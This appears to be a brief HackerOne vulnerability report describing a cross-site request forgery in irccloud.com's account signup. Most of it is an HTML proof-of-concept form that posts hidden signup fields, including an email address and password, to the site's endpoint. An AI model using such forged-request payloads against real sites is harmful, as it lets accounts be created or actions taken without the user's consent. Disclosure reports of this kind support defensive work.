# HackerOne Report:  User Account Creation CSRF 
**Report ID:** 7051
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
Any One Account Can be created and display home screen 
<html>
  <!-- CSRF PoC chandrakant->
  <body>
    <form action="https://www.irccloud.com/chat/signup" method="POST">
      <input type="hidden" name="email" value="chandra.kantnial8&#64;gmail&#46;com" />
      <input type="hidden" name="password" value="chandra1" />
      <input type="hidden" name="realname" value="chandrakant1" />
      <input type="hidden" name="invite" value="" />
      <input type="hidden" name="org&#95;invite" value="" />
      <input type="hidden" name="&#95;reqid" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Please Fix this


## Discussion & Remediation Timeline
